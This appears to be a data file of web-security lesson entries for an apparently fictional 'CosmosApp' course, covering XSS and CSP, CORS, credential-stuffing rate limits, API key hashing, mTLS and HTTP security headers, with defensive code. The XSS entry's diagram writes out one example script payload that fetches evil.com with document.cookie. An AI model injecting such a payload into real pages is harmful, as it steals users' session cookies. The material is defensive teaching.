topics = [
  # 25. XSS Defenses & CSP
  {
    "id": "xss-csp-defense-in-depth",
    "title": "Cross-Site Scripting (XSS) Defenses: Context-Aware Output Encoding & Content Security Policy (CSP)",
    "category": "resilience-security",
    "difficulty": "Intermediate",
    "summary": "Cross-Site Scripting (XSS) allows attackers to execute malicious JavaScript in a victim's browser context, enabling DOM manipulation, keystroke logging, and session impersonation. Comprehensive defense requires context-aware output encoding (HTML, attribute, JS contexts) and a strict Content Security Policy (CSP) with cryptographic nonces.",
    "whyExists": "Web applications process user-supplied input (comments, markdown notes, profiles). If unescaped HTML or script tags are rendered into the DOM, the browser executes the attacker's payload with the full authority and permissions of the legitimate user.",
    "mentalModel": "The Intercom Filter & Guard Station: If an intruder shouts malicious verbal commands through your apartment intercom, context encoding converts the speech into inert text so the smart home system doesn't accidentally execute 'Unlock the front door'. Content Security Policy is the physical guard stationed at your router who shoots down any unauthorized network cable plugged into your wall.",
    "architectureDiagram": """[ Attacker Payload: <script>fetch('evil.com?c=' + document.cookie)</script> ]
       │
       ▼ (Stored in database comment)
[ Vulnerable Application ]: Directly writes to innerHTML ──► SCRIPT EXECUTES!
       │
[ Hardened CosmosApp Application ]:
       ├── Layer 1: Context-Aware HTML Encoding (DOMPurify / Escaping)
       │            Transforms to: &lt;script&gt;...&lt;/script&gt; (Rendered safely as text)
       │
       └── Layer 2: Content Security Policy (CSP)
                    script-src 'self' 'nonce-rAnd0m123';
                    Browser BLOCKS unauthorized inline scripts and external exfiltration!""",
    "cosmosAppStory": "CosmosApp allows team members to format notes using rich Markdown. To eliminate Stored XSS, CosmosApp sanitizes all generated HTML using DOMPurify with an aggressive allowlist, and sets a strict HTTP Content-Security-Policy header using per-request cryptographic nonces, preventing any unauthorized inline script execution.",
    "stepByStep": [
      "Step 1: Application receives user input and stores it safely in parameter-bound database columns.",
      "Step 2: Before rendering untrusted content, the application identifies the output context (HTML body, attribute, URL, JavaScript).",
      "Step 3: Output encoding is applied specifically for that context (e.g. converting '<' to '&lt;').",
      "Step 4: Server generates a unique cryptographic nonce per HTTP request.",
      "Step 5: Server includes the nonce in the Content-Security-Policy header: script-src 'self' 'nonce-...'.",
      "Step 6: Browser verifies script tags against the nonce; any injected script without the matching nonce is blocked."
    ],
    "misconceptions": [
      "HTML escaping alone protects against XSS in all contexts (Escaping '<' and '>' does not protect inside href attributes or inline JavaScript contexts like onclick).",
      "CSP replaces input sanitization (CSP is a secondary defense-in-depth layer; output encoding and sanitization remain mandatory)."
    ],
    "codeSnippet": """import DOMPurify from 'isomorphic-dompurify';

// CosmosApp Safe HTML Sanitization & CSP Headers:
export function sanitizeUserHtml(dirtyHtml: string): string {
  return DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
}

export function generateCspHeader(nonce: string): string {
  return [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'unsafe-inline'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.cosmos.app`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
  ].join('; ');
}""",
    "takeaways": [
      "Always perform context-aware output encoding when rendering user-controlled data into HTML.",
      "Deploy a strict Content Security Policy (CSP) using cryptographic nonces to neutralize injected scripts.",
      "Sanitize rich HTML content using hardened libraries like DOMPurify."
    ],
    "commonPitfall": {
      "mistake": "Using dangerouslySetInnerHTML in React or element.innerHTML without prior cryptographic sanitization.",
      "fix": "Use safe React text nodes or sanitize untrusted HTML using DOMPurify before rendering."
    },
    "knowledgeCheck": {
      "question": "Why does a nonce-based Content Security Policy (CSP) successfully prevent stored XSS attacks from executing?",
      "answer": "Because the server generates a new random nonce for each HTTP response, an attacker who injects a <script> tag cannot predict the nonce, causing the browser to block script execution."
    },
    "nextTopicId": "cors-security-preflights"
  },
  # 26. CORS Security & Preflights
  {
    "id": "cors-security-preflights",
    "title": "Cross-Origin Resource Sharing (CORS): Preflights, Credential Restrictions & Safe API Sharing",
    "category": "resilience-security",
    "difficulty": "Intermediate",
    "summary": "Cross-Origin Resource Sharing (CORS) is a browser security mechanism that relaxes the Same-Origin Policy (SOP) to allow web applications to query APIs on different origins. Safe CORS configuration requires explicit origin whitelisting, correct handling of preflight OPTIONS requests, and strictly avoiding 'Access-Control-Allow-Origin: *' with credentials.",
    "whyExists": "Browsers restrict scripts on one origin (app.domain.com) from reading responses from another origin (api.domain.com) by default. APIs must selectively permit trusted client origins to read data while preventing malicious origins (evil.com) from harvesting authenticated responses.",
    "mentalModel": "The Embassy Courier Clearance: When a messenger arrives at a foreign embassy with an official package, the guards don't open the door immediately. They first send an advance radio query (OPTIONS preflight) asking the front desk if messengers from that specific country are permitted to exchange documents.",
    "architectureDiagram": """[ Browser on https://app.cosmos.app ]            [ API on https://api.cosmos.app ]
                 │                                               │
                 ├── (1) Preflight: OPTIONS /api/data ──────────►│
                 │   Origin: https://app.cosmos.app              │
                 │   Access-Control-Request-Method: DELETE       │
                 │                                               ├── Check Origin against Whitelist
                 │◄── (2) 204 No Content ────────────────────────┤
                 │   Access-Control-Allow-Origin: https://app.cosmos.app
                 │   Access-Control-Allow-Credentials: true
                 │   Access-Control-Allow-Methods: GET, POST, DELETE
                 │
                 ├── (3) Actual Request: DELETE /api/data ──────►│
                 │   (with HttpOnly session cookies)             │
                 │◄── (4) 200 OK { success: true } ──────────────┤""",
    "cosmosAppStory": "CosmosApp hosts its web application at https://cosmos.app and its GraphQL API at https://api.cosmos.app. Because the origins differ, CosmosApp's API configures an exact CORS origin whitelist. It explicitly permits https://cosmos.app with credentials allowed, but strictly rejects requests originating from unauthorized third-party domains.",
    "stepByStep": [
      "Step 1: Browser detects a cross-origin request involving non-simple headers or mutating HTTP methods.",
      "Step 2: Browser automatically dispatches an HTTP OPTIONS preflight request before making the actual request.",
      "Step 3: Server inspects the Origin header and checks it against an explicit allowlist of trusted origins.",
      "Step 4: If trusted, server responds with Access-Control-Allow-Origin, Allow-Methods, Allow-Headers, and Max-Age.",
      "Step 5: If credentials (cookies/auth headers) are required, server adds Access-Control-Allow-Credentials: true.",
      "Step 6: Browser verifies the preflight response and executes the actual API request."
    ],
    "misconceptions": [
      "CORS protects the server from malicious requests (CORS is purely a browser enforcement mechanism; curl, mobile apps, and scripts bypass CORS completely).",
      "Setting Access-Control-Allow-Origin: * with credentials is supported (Browsers explicitly reject responses combining wildcard origins with Allow-Credentials: true)."
    ],
    "codeSnippet": """// CosmosApp Production CORS Middleware:
const ALLOWED_ORIGINS = new Set([
  'https://cosmos.app',
  'https://staging.cosmos.app',
]);

export function handleCors(req: Request): Headers {
  const origin = req.headers.get('Origin');
  const headers = new Headers();

  if (origin && ALLOWED_ORIGINS.has(origin)) {
    headers.set('Access-Control-Allow-Origin', origin);
    headers.set('Access-Control-Allow-Credentials', 'true');
    headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
    headers.set('Access-Control-Max-Age', '86400'); // Cache preflight for 24 hours
    headers.set('Vary', 'Origin');                 // Prevent caching origin collisions
  }

  return headers;
}""",
    "takeaways": [
      "CORS is a browser-side mechanism to relax the Same-Origin Policy; it is not server-side authorization.",
      "Never reflect the untrusted incoming Origin header blindly into Access-Control-Allow-Origin.",
      "Always set the Vary: Origin header when dynamically generating CORS headers to prevent cache poisoning."
    ],
    "commonPitfall": {
      "mistake": "Blindly echoing back req.headers.Origin as Access-Control-Allow-Origin, effectively nullifying the Same-Origin Policy.",
      "fix": "Validate incoming origins against an explicit, immutable allowlist before setting the header."
    },
    "knowledgeCheck": {
      "question": "Can an attacker bypass CORS restrictions by writing a Python script or using curl from their terminal?",
      "answer": "Yes. CORS is strictly enforced by web browsers to protect user browser sessions; terminal tools and non-browser HTTP clients ignore CORS entirely."
    },
    "nextTopicId": "credential-stuffing-rate-limiting"
  },
  # 27. Credential Stuffing & Rate Limiting
  {
    "id": "credential-stuffing-rate-limiting",
    "title": "Credential Stuffing & Password Spraying: Exponential Backoff, Account Lockout & Adaptive CAPTCHAs",
    "category": "resilience-security",
    "difficulty": "Intermediate",
    "summary": "Credential stuffing attacks use automated botnets to test billions of username and password pairs leaked from third-party database breaches against an application. Effective defense requires multi-tiered sliding-window rate limiting (per IP and per account), exponential backoff, leaked credential screening, and adaptive proof-of-work CAPTCHAs.",
    "whyExists": "Over 65% of internet users reuse passwords across multiple websites. When a minor forum is breached, attackers take the leaked credentials and immediately test them against banking, email, and SaaS services at rates of thousands of attempts per second.",
    "mentalModel": "The Bank ATM PIN Throttler: If someone punches 3 incorrect PINs into an ATM, the machine does not allow 10,000 more attempts in the next minute. It temporarily freezes the card, activates camera surveillance, and demands identity verification at a branch counter.",
    "architectureDiagram": """[ Botnet Cluster (1,000 IPs) ] ──(Millions of Leaked Passwords)──► [ CosmosApp Edge Gateway ]
                                                                       │
                                              ┌────────────────────────┴────────────────────────┐
                                              ▼                                                 ▼
                                  [ Rate Limit by IP (Redis) ]                     [ Rate Limit by Account (Redis) ]
                                  Max 10 req/min per IP                            Max 5 failed attempts per account
                                              │                                                 │
                                              ├── Limit Exceeded? ──► HTTP 429 Too Many Requests
                                              │
                                              └── 3 Failed Attempts?
                                                  Trigger Adaptive Turnstile CAPTCHA challenge!""",
    "cosmosAppStory": "CosmosApp detects a coordinated botnet launching 50,000 login attempts per minute across distributed residential proxy IPs. CosmosApp enforces a dual-key rate limiter in Redis: tracking failed attempts both by client IP subnet (/24) and target email address. When an account sees 5 failed attempts, CosmosApp triggers an adaptive Cloudflare Turnstile CAPTCHA and temporarily locks the account.",
    "stepByStep": [
      "Step 1: Incoming POST /auth/login request arrives at the edge gateway.",
      "Step 2: Server checks Redis sliding-window counter for the client IP address; if > 10 attempts/min, returns HTTP 429.",
      "Step 3: Server checks account-level failure counter for the submitted email address.",
      "Step 4: If account failures exceed threshold (e.g. 5 failures in 15 mins), require an interactive CAPTCHA verification.",
      "Step 5: If authentication succeeds, reset account failure counters to zero.",
      "Step 6: If authentication fails, increment failure counter and enforce an artificial delay (e.g. 200–500ms) to throttle brute-forcing."
    ],
    "misconceptions": [
      "Rate limiting by IP address alone stops credential stuffing (Botnets rotate through tens of thousands of residential proxy IPs, easily circumventing IP-only rate limits).",
      "Permanently locking accounts after 5 failures is secure (Permanent lockouts allow attackers to launch denial-of-service attacks by intentionally locking out all corporate accounts)."
    ],
    "codeSnippet": """import Redis from 'ioredis';
const redis = new Redis(process.env.REDIS_URL);

// CosmosApp Dual-Key Sliding-Window Rate Limiter:
export async function checkLoginRateLimit(ip: string, email: string) {
  const ipKey = `rate:login:ip:${ip}`;
  const accountKey = `rate:login:account:${email.toLowerCase()}`;

  const [ipAttempts, accountAttempts] = await Promise.all([
    redis.incr(ipKey),
    redis.incr(accountKey),
  ]);

  if (ipAttempts === 1) await redis.expire(ipKey, 60); // 1-minute window
  if (accountAttempts === 1) await redis.expire(accountKey, 900); // 15-minute window

  if (ipAttempts > 10) {
    throw new Error('Too many requests from this IP. Please try again later.');
  }

  if (accountAttempts > 5) {
    return { requireCaptcha: true, locked: accountAttempts > 10 };
  }

  return { requireCaptcha: false, locked: false };
}""",
    "takeaways": [
      "Implement dual-tier rate limiting tracking both the client IP address and the targeted account identifier.",
      "Use temporary progressive lockouts (15–30 minutes) rather than permanent lockouts to prevent DoS attacks.",
      "Check passwords against the HaveIBeenPwned k-Anonymity API upon user registration and password updates."
    ],
    "commonPitfall": {
      "mistake": "Relying purely on IP-based rate limiting, which is easily defeated by attackers using distributed residential proxy networks.",
      "fix": "Track failed authentication attempts against both the target user identifier and the IP subnet simultaneously."
    },
    "knowledgeCheck": {
      "question": "Why is permanent account lockout considered an architectural antipattern in modern authentication systems?",
      "answer": "Because malicious actors can weaponize permanent lockouts to trigger widespread Denial of Service (DoS) by deliberately failing logins for known executive or administrator emails."
    },
    "nextTopicId": "api-key-security-design"
  },
  # 28. Developer API Keys Design
  {
    "id": "api-key-security-design",
    "title": "Developer API Keys: High-Entropy Prefixing (sk_live_), SHA-256 Storage & Scoped Delegation",
    "category": "resilience-security",
    "difficulty": "Intermediate",
    "summary": "Developer API keys provide programmatic access to APIs for automated scripts, SDKs, and integrations. Secure API key architecture uses high-entropy cryptographically random strings, recognizable prefixes ('cosmos_live_', 'sk_live_') for automated secret scanning, stores only SHA-256 hashes in databases, and enforces granular permission scopes.",
    "whyExists": "Developers inadvertently commit API keys into public GitHub repositories. If keys lack recognizable prefixes, secret scanning bots cannot detect leaks. If the database stores plaintext API keys, a database breach compromises every customer integration instantly.",
    "mentalModel": "The Monogrammed Factory Key: A company issues engraved master keys. Each key begins with the company's embossed logo so airport security scanners recognize it immediately. The factory keeps only an ink imprint of the key's teeth; even if the factory records are stolen, no working keys can be cut.",
    "architectureDiagram": """[ Key Creation: ]
  1. Generate 32 crypto random bytes ──► "sk_live_9a8f2c3d..."
  2. Compute SHA-256 Hash ─────────────► "e3b0c44298fc1c149afb..."
  3. Store in Database:
     INSERT INTO api_keys (key_hash, prefix, user_id, scopes)
     VALUES ('e3b0...', 'sk_live_9a8f', 'usr_42', '["analytics:read"]')
  4. Show full key to developer ONCE (Never recoverable!)
         │
[ API Request: ]
  Authorization: Bearer sk_live_9a8f2c3d...
         │
         ├── Hash incoming key with SHA-256
         ├── Query: SELECT * FROM api_keys WHERE key_hash = SHA256(key)
         └── Validate Scopes & Enforce Rate Limits""",
    "cosmosAppStory": "CosmosApp launches its public developer API. When a developer creates a key, CosmosApp generates a key prefixed with cosmos_live_ followed by 32 bytes of secure entropy. CosmosApp stores only the SHA-256 hash in PostgreSQL and registers its prefix with GitHub Secret Scanning, ensuring that if a developer commits a key to GitHub, it is instantly revoked.",
    "stepByStep": [
      "Step 1: Developer clicks 'Generate API Key' in the CosmosApp developer dashboard.",
      "Step 2: Server generates 32 cryptographically secure random bytes (256 bits of entropy).",
      "Step 3: Server formats key with a distinct prefix: cosmos_live_<base62_random_bytes>.",
      "Step 4: Server computes SHA-256 hash of the full key and saves hash, prefix, and allowed scopes in database.",
      "Step 5: Full key is returned to the user with a warning that it will never be displayed again.",
      "Step 6: On incoming API requests, server hashes the provided token and performs a constant-time lookup in the database."
    ],
    "misconceptions": [
      "Storing API keys in plaintext in the database is acceptable because they aren't user passwords (A database breach exposes all customer API keys, enabling total API takeover).",
      "API keys should use Argon2id (Argon2id is for low-entropy passwords; API keys have 256 bits of entropy, so fast SHA-256 hashing is secure and ensures low API latency)."
    ],
    "codeSnippet": """import crypto from 'node:crypto';

// CosmosApp Developer API Key Generator:
export function generateApiKey(scopes: string[]) {
  const prefix = 'cosmos_live_';
  const secretBytes = crypto.randomBytes(32).toString('base64url');
  const fullKey = `${prefix}${secretBytes}`;

  // Store only the SHA-256 hash:
  const keyHash = crypto.createHash('sha256').update(fullKey).digest('hex');
  const keyPreview = `${prefix}${secretBytes.slice(0, 4)}...`;

  return {
    fullKey,     // Displayed ONCE to developer
    keyHash,     // Stored in Database
    keyPreview,  // Displayed in UI lists
    scopes,
  };
}""",
    "takeaways": [
      "Always use distinct prefixes (e.g. sk_live_, cosmos_live_) to enable automated secret scanning detection.",
      "Never store API keys in plaintext; store the SHA-256 hash.",
      "Present the full API key to the developer exactly once upon generation."
    ],
    "commonPitfall": {
      "mistake": "Storing raw, plaintext API keys in the database so the dashboard can 'display the key anytime'.",
      "fix": "Store only the SHA-256 hash. If a user loses their key, they must roll and regenerate a new one."
    },
    "knowledgeCheck": {
      "question": "Why should developer API keys begin with a recognizable prefix like 'sk_live_' or 'cosmos_live_'?",
      "answer": "It allows automated secret scanning tools (such as GitHub Secret Scanning) to detect accidentally committed keys in code repositories and notify the vendor for instant revocation."
    },
    "nextTopicId": "mtls-zero-trust-architecture"
  },
  # 29. mTLS & Zero Trust Architecture
  {
    "id": "mtls-zero-trust-architecture",
    "title": "Mutual TLS (mTLS) & Zero Trust: Cryptographic Service-to-Service Authentication",
    "category": "resilience-security",
    "difficulty": "Advanced",
    "summary": "In a Zero Trust architecture, the internal corporate network is treated as inherently hostile. Mutual TLS (mTLS) authenticates both sides of a network connection using X.509 digital certificates, ensuring that every service-to-service RPC is encrypted, cryptographically authenticated, and protected against eavesdropping and man-in-the-middle attacks.",
    "whyExists": "Perimeter-based security ('castle-and-moat') assumes everything inside the corporate firewall or VPC is trustworthy. If an attacker breaches one peripheral server or container, they can freely sniff network traffic and send unauthenticated commands to any internal database or microservice.",
    "mentalModel": "The Two-Way Passport Check: In standard TLS, only the bank website shows its badge to the customer. In Mutual TLS, the passenger demands the taxi driver's license, and the taxi driver simultaneously demands a government security clearance card from the passenger before opening the doors.",
    "architectureDiagram": """[ Billing Microservice (Client) ]                     [ Payment Gateway Service (Server) ]
                 │                                                        │
                 ├── (1) TLS ClientHello ────────────────────────────────►│
                 │◄── (2) ServerHello + Server Certificate (X.509) ───────┤
                 │    + CertificateRequest (Demand Client Cert!)          │
                 │                                                        │
  1. Verifies Server Cert against Internal CA                             │
  2. Presents Client X.509 Certificate ──────────────────────────────────►│
                 │                                                        ├── Verifies Client Cert against Internal CA
                 │                                                        ├── Extracts SAN: 'spiffe://cosmos/billing'
                 │◄── (3) Handshake Complete (Encrypted & Authenticated) ──┤
                 │
                 ├── (4) gRPC RPC: ExecuteTransaction() ─────────────────►│
                 │   (Mathematically guaranteed caller identity!)         ▼""",
    "cosmosAppStory": "CosmosApp deploys its microservices on Kubernetes using an Istio service mesh. Rather than relying on private IP addresses or network firewalls, all microservice-to-microservice traffic is secured with mTLS. The payment service rejects any incoming connection whose client certificate does not contain a SPIFFE ID verifying it as the authorized billing service.",
    "stepByStep": [
      "Step 1: Private Certificate Authority (CA) issues X.509 certificates to each microservice with its SPIFFE ID in the SAN field.",
      "Step 2: Client initiates TLS connection with server.",
      "Step 3: Server presents its certificate; client verifies the server certificate against the private CA trust store.",
      "Step 4: Server requests client authentication (CertificateRequest) and presents accepted CA roots.",
      "Step 5: Client presents its X.509 certificate and proves ownership of the private key via CertificateVerify signature.",
      "Step 6: Server validates client certificate and grants access only if the client's identity is authorized."
    ],
    "misconceptions": [
      "VPC / Internal network traffic doesn't need encryption (Zero Trust principles mandate that the network is always assumed to be compromised; all internal traffic must be encrypted).",
      "mTLS replaces API authorization (mTLS proves machine identity; application-level authorization engines like RBAC/ABAC must still evaluate permissions)."
    ],
    "codeSnippet": """import https from 'node:https';
import fs from 'node:fs';

// CosmosApp Secure mTLS HTTPS Agent:
export function createMtlsAgent() {
  return new https.Agent({
    // Client credentials (who WE are):
    cert: fs.readFileSync('/etc/certs/billing-service.crt'),
    key: fs.readFileSync('/etc/certs/billing-service.key'),

    // Trusted Internal Certificate Authority (who the SERVER must be):
    ca: fs.readFileSync('/etc/certs/internal-ca.crt'),

    // Reject servers whose certificates are not signed by our internal CA:
    rejectUnauthorized: true,
  });
}""",
    "takeaways": [
      "Zero Trust assumes the internal network is hostile; all communication must be authenticated and encrypted.",
      "Mutual TLS authenticates both client and server cryptographically using X.509 certificates.",
      "Use service meshes (Envoy, Istio, Linkerd) with SPIFFE/SPIRE for automated certificate issuance and rotation."
    ],
    "commonPitfall": {
      "mistake": "Relying on internal IP whitelisting or VPC boundaries for microservice authentication.",
      "fix": "Enforce Mutual TLS (mTLS) with cryptographically validated client certificates for all inter-service traffic."
    },
    "knowledgeCheck": {
      "question": "How does Mutual TLS (mTLS) differ from standard one-way TLS used on the public web?",
      "answer": "In standard TLS, only the server presents a certificate to prove its identity; in mTLS, both the client and the server present X.509 certificates and prove private key ownership."
    },
    "nextTopicId": "http-security-headers-defense"
  },
  # 30. HTTP Security Headers
  {
    "id": "http-security-headers-defense",
    "title": "Comprehensive HTTP Security Headers: HSTS Preload, X-Content-Type-Options & Permissions-Policy",
    "category": "resilience-security",
    "difficulty": "Beginner",
    "summary": "HTTP Security Headers instruct web browsers to enforce strict hardware and protocol security controls. A hardened baseline mandates Strict-Transport-Security (HSTS Preload), X-Content-Type-Options (nosniff), X-Frame-Options (DENY), Referrer-Policy, and Permissions-Policy to eliminate MIME-sniffing, clickjacking, and SSL-stripping.",
    "whyExists": "Browsers are legacy-compatible systems that default to permissive behaviors: sniffing MIME types, rendering sites inside hidden iframes (clickjacking), and allowing insecure HTTP downgrades (SSL stripping). Security headers activate the browser's defense mechanisms.",
    "mentalModel": "The Bank Building's Physical Defenses: Steel shutters (X-Frame-Options prevents clickjacking), biometric access gates (Permissions-Policy blocks unauthorized microphones/cameras), and reinforced airlocks (HSTS prevents falling back to unencrypted access).",
    "architectureDiagram": """[ HTTP Response Headers from CosmosApp Edge ]
       │
       ├── Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
       │   └── Browser FORBIDS insecure HTTP connections forever (Immunized against SSL Stripping!)
       │
       ├── X-Content-Type-Options: nosniff
       │   └── Browser REFUSES to execute images/styles as scripts (Defeats MIME Confusion!)
       │
       ├── X-Frame-Options: DENY
       │   └── Browser REFUSES to render CosmosApp inside an iframe (Defeats Clickjacking!)
       │
       ├── Referrer-Policy: strict-origin-when-cross-origin
       │   └── Protects URL parameters from leaking to third-party domains
       │
       └── Permissions-Policy: camera=(), microphone=(), geolocation=()
           └── Disables invasive hardware APIs on the origin""",
    "cosmosAppStory": "CosmosApp deploys its edge routing configuration on Cloudflare and Next.js. By setting HSTS with preload, CosmosApp ensures that browsers never attempt an unencrypted HTTP connection. By configuring X-Frame-Options: DENY and nosniff, CosmosApp prevents malicious sites from framing the workspace for clickjacking or injecting malicious MIME files.",
    "stepByStep": [
      "Step 1: Configure edge reverse proxy (Cloudflare, Nginx, Next.js middleware) to inject security headers on every response.",
      "Step 2: Set Strict-Transport-Security with max-age=63072000 (2 years), includeSubDomains, and preload.",
      "Step 3: Submit domain to the Chromium HSTS Preload list (preloading HSTS into Chrome, Safari, and Firefox).",
      "Step 4: Set X-Content-Type-Options: nosniff to enforce strict MIME-type handling.",
      "Step 5: Set X-Frame-Options: DENY (or CSP frame-ancestors 'none') to defeat clickjacking.",
      "Step 6: Set Permissions-Policy to disable unnecessary browser hardware APIs (camera, microphone, accelerometer)."
    ],
    "misconceptions": [
      "HSTS works on the very first user visit without preloading (On the very first visit, an attacker can strip SSL before HSTS is received; preloading hardcodes HTTPS in the browser binary).",
      "X-Frame-Options is still sufficient on modern sites (CSP frame-ancestors is the modern standard and supersedes X-Frame-Options, but both are used for defense-in-depth)."
    ],
    "codeSnippet": """// CosmosApp Next.js Security Headers Configuration (next.config.js):
const securityHeaders = [
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload',
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY',
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin',
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=(), payment=()',
  },
];

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};""",
    "takeaways": [
      "HSTS Preload permanently forces browsers to use HTTPS, defeating SSL stripping attacks.",
      "X-Content-Type-Options: nosniff blocks MIME-confusion script execution vulnerabilities.",
      "Use X-Frame-Options: DENY and CSP frame-ancestors to prevent clickjacking UI overlay attacks."
    ],
    "commonPitfall": {
      "mistake": "Setting HSTS with a short max-age (e.g. 300 seconds) without includeSubDomains or preload.",
      "fix": "Set max-age=63072000 (2 years), includeSubDomains, and register the domain on hstspreload.org."
    },
    "knowledgeCheck": {
      "question": "What attack vector is neutralized by adding the 'X-Content-Type-Options: nosniff' HTTP response header?",
      "answer": "MIME-confusion attacks, where a browser attempts to guess ('sniff') the content type of an uploaded non-executable file (like an image) and executes it as malicious JavaScript."
    }
  }
]
